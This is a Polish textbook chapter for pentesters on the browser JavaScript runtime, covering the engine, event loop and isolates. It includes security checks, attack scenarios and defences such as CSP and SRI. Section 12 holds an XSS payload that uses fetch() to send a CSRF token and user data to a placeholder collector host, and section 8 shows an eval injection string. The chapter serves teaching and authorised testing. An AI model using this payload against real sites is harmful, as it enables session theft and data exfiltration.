# Rozdział 1: JavaScript Runtime

## 1. Czym jest JavaScript Runtime

**JavaScript Runtime** (środowisko uruchomieniowe JavaScript) to kompletny zestaw komponentów oprogramowania, który umożliwia wykonywanie kodu JavaScript. Nie jest to sam język — JavaScript jako specyfikacja (ECMAScript) opisuje jedynie składnię i semantykę. Runtime to implementacja, która tę specyfikację realizuje i dostarcza dodatkowo zestaw możliwości wykraczających poza czysty język.

Runtime składa się z kilku warstw:

- **Silnik JavaScript** — parsuje i wykonuje kod (np. V8 w Chrome, SpiderMonkey w Firefox, JavaScriptCore w Safari)
- **Web API** — interfejsy udostępniane przez przeglądarkę, nieobecne w samym ECMAScript (np. `fetch`, `setTimeout`, `document`, `navigator`)
- **Event Loop** — mechanizm koordynujący wykonanie kodu asynchronicznego
- **Callback Queue / Microtask Queue** — kolejki oczekujących wywołań

JavaScript Runtime w przeglądarce różni się od środowiska Node.js. Przeglądarka dostarcza Web API (DOM, Fetch, Cookies, Storage). Node.js dostarcza API systemu operacyjnego (system plików, procesy, sieci na poziomie TCP). Obie platformy używają podobnych silników (Chrome i Node.js używają V8), ale otaczający runtime jest zupełnie inny.

### Kto stworzył i kiedy

- **V8** (Google, 2008) — używany w Chrome, Chromium, Edge (od 2020), Node.js, Deno
- **SpiderMonkey** (Netscape/Mozilla, 1995) — pierwszy silnik JavaScript w historii, używany w Firefox
- **JavaScriptCore** (Apple, 2002) — używany w Safari i WebKit
- **Chakra** (Microsoft, 2008) — używany w Internet Explorer i starym Edge, wycofany

### Czy jest częścią JavaScript czy Web API

Runtime jako całość to bytem hybrydowym. Silnik (V8, SpiderMonkey) realizuje specyfikację ECMAScript — to "czysty JavaScript". Web API (DOM, fetch, localStorage) to standard W3C/WHATWG dostarczany przez przeglądarkę — to nie JavaScript, lecz interfejsy napisane w C++ udostępniane kodowi JS.

---

## 2. Dlaczego powstał

### Problem: strony statyczne

W 1995 roku strony internetowe były dokumentami HTML — statycznym tekstem z obrazkami. Gdy użytkownik wypełnił formularz i kliknął "Wyślij", przeglądarka wysyłała żądanie HTTP i otrzymywała nową stronę. Każda interakcja wymagała przeładowania.

Netscape chciał stworzyć technologię, która pozwoli na:

1. Walidację formularzy *przed* wysłaniem ich na serwer
2. Proste animacje i interakcje bez przeładowania strony
3. Dynamiczne modyfikowanie treści po załadowaniu

Brendan Eich stworzył JavaScript w ciągu 10 dni w maju 1995 roku. Pierwotna nazwa to Mocha, potem LiveScript, a ostatecznie JavaScript (z przyczyn marketingowych — Sun Microsystems promowało wtedy Javę).

### Problem: runtime jednowątkowy

JavaScript od początku był jednowątkowy — jedna instrukcja na raz. To celowa decyzja projektowa. Wielowątkowość z dostępem do wspólnego DOM stworzyłaby problemy race condition niemożliwe do zarządzenia przez programistów stron.

Jednowątkowość oznacza jednak, że długie operacje (ładowanie pliku, żądanie sieciowe) blokowałyby interfejs. Rozwiązaniem stał się model asynchroniczny oparty na callbackach, a potem Promises i async/await — wszystko zarządzane przez Event Loop.

---

## 3. Jak działa

### Architektura

```
┌─────────────────────────────────────────────────────────┐
│                     PRZEGLĄDARKA                        │
│                                                         │
│  ┌──────────────────────────────────────────────────┐  │
│  │              JAVASCRIPT RUNTIME                  │  │
│  │                                                  │  │
│  │  ┌─────────────────┐  ┌────────────────────┐    │  │
│  │  │   SILNIK JS     │  │     WEB API        │    │  │
│  │  │                 │  │                    │    │  │
│  │  │  ┌───────────┐  │  │  - DOM             │    │  │
│  │  │  │  Parser   │  │  │  - fetch()         │    │  │
│  │  │  └─────┬─────┘  │  │  - setTimeout()   │    │  │
│  │  │        │        │  │  - localStorage    │    │  │
│  │  │  ┌─────▼─────┐  │  │  - navigator      │    │  │
│  │  │  │    AST    │  │  │  - WebSocket       │    │  │
│  │  │  └─────┬─────┘  │  │  - ...            │    │  │
│  │  │        │        │  └────────────────────┘    │  │
│  │  │  ┌─────▼─────┐  │                            │  │
│  │  │  │Interpreter│  │  ┌────────────────────┐    │  │
│  │  │  │    /      │  │  │    EVENT LOOP       │    │  │
│  │  │  │   JIT     │  │  │                    │    │  │
│  │  │  └─────┬─────┘  │  │  Microtask Queue   │    │  │
│  │  │        │        │  │  Callback Queue    │    │  │
│  │  │  ┌─────▼─────┐  │  └────────────────────┘    │  │
│  │  │  │Call Stack │  │                            │  │
│  │  │  └───────────┘  │  ┌────────────────────┐    │  │
│  │  │                 │  │      HEAP          │    │  │
│  │  │                 │  │  (alokacja pamięci)│    │  │
│  │  └─────────────────┘  └────────────────────┘    │  │
│  └──────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────┘
```

### Przepływ wykonania kodu

Gdy przeglądarka napotyka `<script>` lub ładuje plik `.js`:

**Krok 1: Pobieranie kodu**

Przeglądarka wysyła żądanie HTTP GET po plik JavaScript. Odpowiedź to tekst w formacie UTF-8. Plik trafia do parsera.

**Krok 2: Parsowanie**

Parser silnika JS czyta tekst kodu i buduje **AST (Abstract Syntax Tree)** — drzewiaste reprezentację struktury programu. Przykład:

```javascript
let x = 2 + 3;
```

Staje się AST mniej więcej takiej struktury:

```
VariableDeclaration
  └── VariableDeclarator
        ├── Identifier (x)
        └── BinaryExpression (+)
              ├── Literal (2)
              └── Literal (3)
```

Parser sprawdza składnię. Błąd składniowy (SyntaxError) jest wykrywany na tym etapie — *przed* wykonaniem jakiegokolwiek kodu.

**Krok 3: Kompilacja**

Nowoczesne silniki JS używają **JIT (Just-In-Time compilation)**. Zamiast interpretować AST linijka po linijce, kompilują "gorący" kod (często wykonywany) do kodu maszynowego w locie. V8 używa do tego dwóch kompilatorów: Sparkplug (szybki, bez optymalizacji) i Maglev/Turbofan (wolniejszy, ale silnie optymalizujący).

**Krok 4: Wykonanie**

Skompilowany kod trafia na **Call Stack** (stos wywołań). Program zaczyna się od globalnego **Execution Context** (kontekstu wykonania). Każde wywołanie funkcji dodaje nową ramkę na stos.

**Krok 5: Obsługa asynchroniczności**

Gdy kod wywołuje asynchroniczne Web API (np. `fetch()`, `setTimeout()`), silnik przekazuje zadanie do przeglądarki. Przeglądarka obsługuje je poza stosem wywołań. Po zakończeniu callbacki trafiają do kolejki. **Event Loop** przenosi je na Call Stack gdy jest pusty.

---

## 4. Co dzieje się wewnętrznie

### Heap — alokacja pamięci

**Heap** to obszar pamięci do dynamicznej alokacji obiektów. Gdy piszesz `let obj = {}`, silnik alokuje pamięć w Heap i zwraca referencję. Garbage Collector (GC) zarządza zwalnianiem pamięci, gdy obiekty nie są już osiągalne.

V8 używa generacyjnego garbage collectora:
- **Young Generation** — nowe, krótko żyjące obiekty
- **Old Generation** — obiekty, które przeżyły kilka cykli GC

### Isolates — izolacja między kartami

V8 używa konceptu **Isolate** — każdy izolat to niezależna instancja silnika z własnym Heap i własnym stanem. W Chrome każda karta przeglądarki zazwyczaj działa w osobnym procesie (Process Per Site), co oznacza osobny Isolate. To kluczowe dla bezpieczeństwa — kod ze strony A nie może bezpośrednio odwołać się do obiektów strony B.

### Kontekst vs Isolate

Wewnątrz jednego Isolate może istnieć wiele **Kontekstów** — każdy z własnym globalnym obiektem (`window`), ale współdzielący Heap. To pozwala na izolację np. iframe'ów na tej samej stronie przy zachowaniu wydajności.

### Lifecycle skryptu

```
HTML Parser
    │
    ▼ napotyka <script src="app.js">
Network Request
    │
    ▼ pobiera plik app.js
Parsing (tokenizer → AST)
    │
    ▼ błąd? SyntaxError, stop
Compilation (Baseline → JIT)
    │
    ▼
Execution Context Creation
    │
    ▼
Global Code Execution
    │
    ▼ wywołania funkcji → Call Stack frames
    │
    ▼ async operacje → Web API → Callback Queue
    │
    ▼ Event Loop → pobiera callbacki → Call Stack
```

---

## 5. Analogiczny przykład z życia

Wyobraź sobie restaurację:

- **Kucharz** = silnik JavaScript. Wykonuje przepisy (kod) jeden po drugim. Nie może gotować dwóch dań jednocześnie (jednowątkowość).
- **Kelner** = Web API. Gdy kucharz mówi "czekaj na dostawę", kelner idzie po składniki (operacja asynchroniczna) i wraca gdy są gotowe.
- **Notes zamówień** = Callback Queue. Kelner zapisuje, że dostawa przyszła i kucharz powinien wrócić do tego dania.
- **Menedżer sali** = Event Loop. Sprawdza czy kucharz skończył bieżące danie (Call Stack pusty). Jeśli tak, przynosi mu następne zamówienie z notesu.

Kucharz nigdy nie czeka bezczynnie. Gdy czeka na dostawę, gotuje inne dania. Gdy dostawa przychodzi, kelner informuje menedżera, a ten przekazuje zamówienie kucharzowi gdy skończy aktualne zadanie.

---

## 6. Przykład kodu

```html
<!DOCTYPE html>
<html>
<head>
    <title>Runtime Demo</title>
</head>
<body>
    <script>
        // Linia 1: Kod synchroniczny - wykonuje się natychmiast
        console.log("Start");

        // Linia 2: setTimeout to Web API - rejestruje callback
        // przeglądarka ustawi timer POZA silnikiem JS
        setTimeout(function() {
            // Ta funkcja trafi do Callback Queue po 0ms
            // ale NIE wykona się przed "Koniec"
            console.log("Timer");
        }, 0);

        // Linia 3: Promise.resolve().then() to Microtask
        // trafia do Microtask Queue - ma wyższy priorytet niż Callback Queue
        Promise.resolve().then(function() {
            console.log("Promise");
        });

        // Linia 4: Kolejny synchroniczny kod
        console.log("Koniec");

        // Wynik w konsoli:
        // Start
        // Koniec
        // Promise   ← microtask, przed callbackiem setTimeout
        // Timer     ← callback, po microtaskach
    </script>
</body>
</html>
```

**Wyjaśnienie linijka po linijce:**

- `console.log("Start")` — trafia bezpośrednio na Call Stack. `console.log` to metoda Web API (nie ECMAScript). Wykonuje się natychmiast. Call Stack: `[main(), console.log("Start")]` → po wykonaniu: `[main()]`.

- `setTimeout(fn, 0)` — `setTimeout` to Web API. Silnik JS rejestruje żądanie u przeglądarki i wraca natychmiast. Przeglądarka niezależnie czeka 0ms, potem umieszcza `fn` w Callback Queue.

- `Promise.resolve().then(fn)` — `Promise.resolve()` tworzy już rozwiązany Promise. `.then(fn)` rejestruje callback w Microtask Queue. Microtask Queue jest opróżniana *po każdym zadaniu synchronicznym*, przed Callback Queue.

- `console.log("Koniec")` — synchroniczne, wykonuje się natychmiast.

- Po zakończeniu synchronicznego kodu Event Loop sprawdza Microtask Queue → znajduje `fn` z Promise → wykonuje → drukuje "Promise".

- Następnie Event Loop bierze z Callback Queue callbacki setTimeout → drukuje "Timer".

---

## 7. Przykład z prawdziwej aplikacji

### Aplikacja bankowa (SPA)

W typowej aplikacji Single Page Application opartej na React/Vue:

```javascript
// Inicjalizacja aplikacji — globalne ustawienie runtimowe
window.__APP_CONFIG__ = {
    apiUrl: "https://api.bank.com",
    sessionTimeout: 900000
};

// Framework rejestruje event listenery — callback queue
document.addEventListener("DOMContentLoaded", function() {
    initializeApp(); // wywołanie synchroniczne wewnątrz callbacka
});

async function initializeApp() {
    // fetch() to Web API — operacja asynchroniczna
    // silnik JS nie blokuje się — oddaje sterowanie Event Loop
    const userData = await fetch("/api/user/profile");
    const json = await userData.json();
    
    // Po otrzymaniu odpowiedzi kod wraca do Call Stack przez microtask
    renderDashboard(json);
}
```

Pentester widzi tutaj:
- `window.__APP_CONFIG__` — konfiguracja dostępna globalnie. Czy zawiera wrażliwe dane (tokeny, klucze API)?
- `fetch("/api/user/profile")` — jakie nagłówki wysyła? Jakie cookies? Jaka polityka CORS?

### Panel administracyjny

```javascript
// Typowy wzorzec — runtime ładuje konfigurację z atrybutów HTML
const config = JSON.parse(
    document.getElementById("app").dataset.config
);

// Jeśli data-config zawiera niezaufane dane → możliwy JSON injection
// Jeśli użyte eval() zamiast JSON.parse() → możliwy Code Injection
```

---

## 8. Typowe błędy programistów

### Błąd 1: Zanieczyszczanie globalnego scope

```javascript
// Błąd: brak var/let/const tworzy zmienną globalną
function processUser(name) {
    userName = name; // globalny! dostępny jako window.userName
}
```

Każda zmienna globalna jest właściwością `window`. Atakujący mogą odczytywać i nadpisywać te wartości z konsoli DevTools lub wstrzykniętego kodu.

### Błąd 2: Blokowanie Event Loop

```javascript
// Błąd: długa synchroniczna operacja blokuje UI
function findUser(id) {
    let result = null;
    for (let i = 0; i < 10000000; i++) {
        if (database[i].id === id) result = database[i];
    }
    return result;
}
```

Zablokowany Event Loop = zamrożony interfejs. Użytkownik nie może nic kliknąć. Żadne callbacki nie wykonują się — w tym callbacki bezpieczeństwa (np. timeout sesji).

### Błąd 3: eval() i podobne

```javascript
// Bardzo źle: eval wykonuje ciąg znaków jako kod JS
const userInput = "<pobrane z URL>";
eval("processData('" + userInput + "')");
// Wystarczy wstrzyknąć: '); maliciousCode(); //
```

`eval()`, `Function()`, `setTimeout("string")`, `setInterval("string")` — wszystkie interpretują ciągi znaków jako kod. To XSS execution sink.

### Błąd 4: Dostęp do window przed załadowaniem DOM

```javascript
// Błąd: skrypt w <head> bez defer/async
const button = document.getElementById("submit"); // null — DOM jeszcze nie istnieje
button.addEventListener("click", ...); // TypeError: Cannot read property of null
```

---

## 9. Znaczenie dla bezpieczeństwa

### Fundamentalne dla bezpieczeństwa przeglądarki

JavaScript Runtime to fundament modelu bezpieczeństwa przeglądarki. Niemal każda podatność aplikacji webowej — XSS, CSRF, Prototype Pollution, DOM Clobbering — ostatecznie wykonuje kod JavaScript w runtime.

### Same-Origin Policy w kontekście Runtime

Przeglądarka izoluje Runtimes różnych stron poprzez **Same-Origin Policy (SOP)**. Kod z `https://bank.com` nie może dostępu do danych ze strony `https://evil.com` w tej samej przeglądarce — bo działają w osobnych Kontekstach/Isolate'ach.

SOP chroni przed:
- Odczytywaniem DOM innych stron
- Dostępem do cookies/storage innych origins
- Wykonywaniem cross-origin fetch (z pewnymi wyjątkami przez CORS)

### XSS — łamanie izolacji Runtime

**Cross-Site Scripting (XSS)** polega na wstrzyknięciu kodu JavaScript do strony w taki sposób, że przeglądarka wykonuje go w kontekście (Execution Context) atakowanej strony — a więc z dostępem do jej DOM, cookies, storage, tokenów.

Atakujący nie "łamie" Runtime — "wskakuje" do istniejącego kontekstu ofiary.

### Powiązane CWE

- **CWE-79** — Cross-site Scripting
- **CWE-95** — Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')
- **CWE-116** — Improper Encoding or Escaping of Output

### OWASP

- **A03:2021 – Injection** (XSS jest podkategorią)
- **A05:2021 – Security Misconfiguration** (błędna konfiguracja CSP, brak isolacji)

---

## 10. Jak identyfikować podczas pentestu

### DevTools → Console

Otwórz DevTools (F12) → zakładka **Console**.

Wpisz:
```javascript
window
```
Zobaczysz wszystkie właściwości globalnego obiektu. Szukaj:
- Zmiennych konfiguracyjnych: `__config__`, `__env__`, `APP_CONFIG`, `window.settings`
- Tokenów: `authToken`, `csrfToken`, `apiKey`
- Metadanych: `_user`, `currentUser`, `userData`

```javascript
// Listuj własne właściwości window które nie są natywne
Object.keys(window).filter(k => !['window','document','location','navigator','fetch'].includes(k))
```

### DevTools → Sources

Zakładka **Sources** pokazuje wszystkie załadowane pliki JavaScript.

Zwróć uwagę na:
- Pliki z nazwami sugerującymi logikę biznesową: `auth.js`, `payment.js`, `admin.js`
- Source maps (`.map`) — ujawniają oryginalny kod przed minifikacją/bundlingiem
- Zmienne globalne zdefiniowane w plikach

### DevTools → Network

Zakładka **Network** → filtr **JS** — wszystkie ładowane skrypty.

Sprawdź:
- Nagłówki odpowiedzi (Content-Type, CORS, CSP)
- Czy pliki JS mają Source Map URL (nagłówek `SourceMap:` lub komentarz `//# sourceMappingURL=`)
- Czy skrypty są ładowane z CDN (potencjalnie podatne, jeśli bez SRI)

### Szukanie secretów w kodzie JS

```bash
# W Burp Suite - szukaj w Response body
# W przeglądarce - Ctrl+Shift+F (Search across all sources)

# Wzorce do szukania:
apiKey
secret
token
password
Bearer
Authorization
```

### Artefakty w konsoli

Sprawdź czy aplikacja loguje do konsoli:
```javascript
// Typowe "wycieki" deweloperskie
console.log(userData)
console.debug("Token:", token)
```

---

## 11. Jak testować bezpieczeństwo

```
□ Czy aplikacja używa eval() lub Function() z niezaufanymi danymi?
□ Czy w window.* są wrażliwe dane (tokeny, klucze, PII)?
□ Czy pliki JS mają dostępne Source Maps ujawniające minifikowany kod?
□ Czy skrypty zewnętrzne (CDN) są chronione przez Subresource Integrity (SRI)?
□ Czy Content-Security-Policy blokuje inline scripts i eval?
□ Czy aplikacja loguje wrażliwe dane do console.log()?
□ Czy silnik JS jest aktualny (brak znanych podatności przeglądarki)?
□ Czy globalne zmienne mogą być nadpisane przez atakującego (prototype pollution)?
□ Czy timeout sesji jest rzeczywiście wymuszany (nie tylko po stronie JS)?
□ Czy error messages w runtime nie ujawniają ścieżek, wersji, szczegółów stacku?
```

---

## 12. Typowe scenariusze ataków

### Scenariusz 1: Exfiltracja danych z window.*

**Wymagania:** Podatność XSS (Stored lub Reflected) na stronie ofiary.

**Warunki:** Aplikacja przechowuje wrażliwe dane w globalnych zmiennych JavaScript.

**Przebieg:**
1. Pentester identyfikuje zmienne globalne zawierające wrażliwe dane: `window.csrfToken`, `window.userData`
2. Pentester wstrzykuje payload XSS który odczytuje i eksfiltruje te dane
3. Przeglądarka ofiary wykonuje payload w kontekście atakowanej strony
4. Dane trafiają do kontrolowanego przez pentestera endpointu

**Przykład payload (wyłącznie dla autoryzowanych testów):**
```javascript
// Payload w kontekście autoryzowanego pentestu
fetch("https://[twoj-collector]/?data=" + 
    encodeURIComponent(JSON.stringify({
        csrf: window.csrfToken,
        user: window.currentUser
    }))
);
```

**Ograniczenia:** Wymaga podatności XSS. Ograniczony przez CSP (blokada zewnętrznych połączeń).

**Wpływ:** Kradzież tokenów, przejęcie sesji, eskalacja uprawnień.

### Scenariusz 2: Runtime Code Injection przez eval()

**Wymagania:** Aplikacja używa `eval()` lub `new Function()` z danymi wejściowymi użytkownika.

**Przebieg:**
1. Pentester identyfikuje wywołania eval() w kodzie źródłowym
2. Identyfikuje wektor wejściowy (parametr URL, pole formularza)
3. Wstrzykuje payload przerywający stringowy kontekst

**Ograniczenia:** Wymaga znalezienia eval-sink z kontrolowanymi danymi wejściowymi.

**Wpływ:** Pełne wykonanie kodu w kontekście aplikacji.

---

## 13. Jak się zabezpieczać

### 1. Unikaj eval() i podobnych

```javascript
// Źle
eval(userInput);
new Function(userInput)();
setTimeout(userInput, 100);

// Dobrze - JSON.parse zamiast eval dla danych
const data = JSON.parse(userInput);

// Dobrze - zdefiniuj dozwolone operacje
const allowedActions = {
    'sayHello': () => console.log('Hello'),
    'sayBye': () => console.log('Bye')
};
allowedActions[userInput]?.();
```

### 2. Ogranicz globalne zmienne

```javascript
// Źle - przypadkowa globalna
function init() {
    config = loadConfig(); // brak const/let/var!
}

// Dobrze - IIFE lub moduł ES
(function() {
    const config = loadConfig();
    // config niewidoczne poza tą funkcją
})();

// Najlepiej - moduły ES6 (domyślnie izolowane)
// plik config.mjs
const config = loadConfig();
export { config }; // eksportowane explicite
```

### 3. Content Security Policy

```http
Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self' 'nonce-{random}';
  object-src 'none';
  base-uri 'self';
```

Dobra CSP eliminuje możliwość inline scripts i eval, co drastycznie utrudnia eksploitację XSS.

### 4. Source Maps w produkcji

```javascript
// webpack.config.js
module.exports = {
    devtool: process.env.NODE_ENV === 'production' 
        ? false          // brak source map w produkcji
        : 'source-map'  // tylko w development
};
```

### 5. Subresource Integrity dla zewnętrznych skryptów

```html
<script 
    src="https://cdn.example.com/lib.js"
    integrity="sha384-abc123..."
    crossorigin="anonymous">
</script>
```

---

## 14. Podsumowanie

**Kluczowe fakty:**

1. JavaScript Runtime = silnik JS (V8/SpiderMonkey) + Web API przeglądarki + Event Loop
2. Silnik jest jednowątkowy — kod synchroniczny zawsze wykona się przed callbackami
3. Web API (fetch, setTimeout, DOM) to nie JavaScript — to C++ udostępniane przeglądarce
4. Każda strona/karta ma własny Izolat — fundamentalna izolacja bezpieczeństwa
5. XSS łamie izolację poprzez wstrzyknięcie kodu do istniejącego kontekstu

**Najczęstsze nieporozumienia:**

- "JavaScript jest wielowątkowy" — NIE, jest jednowątkowy. Web Workers to osobne wątki bez dostępu do głównego DOM.
- "setTimeout(fn, 0) wykonuje się natychmiast" — NIE, callback trafia do kolejki i wykona się dopiero gdy Call Stack jest pusty.
- "eval() jest wolny, więc go nie używamy" — Pomijasz ważniejszy powód: jest podatny na Code Injection.

**Najczęstsze pytania:**

*Czy V8 to to samo co JavaScript?* — Nie. V8 to implementacja specyfikacji ECMAScript. To jak różnica między przepisem a gotowym daniem.

*Czy Node.js to ta sama runtime co przeglądarka?* — Używają tego samego silnika (V8), ale zupełnie innych Web API vs Node.js API.

---

## Jak rozpoznać w prawdziwej aplikacji

1. Otwórz DevTools → **Console** → wpisz `Object.keys(window)` → szukaj niestandardowych właściwości
2. Otwórz **Sources** → przejrzyj listę plików JS → szukaj plików `.map`
3. Otwórz **Network** → przefiltruj po `JS` → sprawdź nagłówki każdego skryptu
4. W Console: `window.__proto__` — czy framework zostawił ślady?
5. Szukaj w plikach JS fraz: `eval(`, `new Function(`, `document.write(`, `innerHTML =`

---

## Powiązania

```
JavaScript Runtime
        │
        ├──► Execution Context (Rozdział 2)
        │         każde wywołanie funkcji tworzy nowy kontekst
        │
        ├──► Call Stack (Rozdział 3)
        │         stos aktywnych kontekstów
        │
        ├──► Event Loop (Rozdział 8)
        │         zarządza asynchronicznością
        │
        ├──► DOM (Rozdział 9)
        │         Web API dostarczane przez przeglądarkę
        │
        └──► Content Security Policy (Rozdział 36)
                  mechanizm kontroli co Runtime może wykonać
```
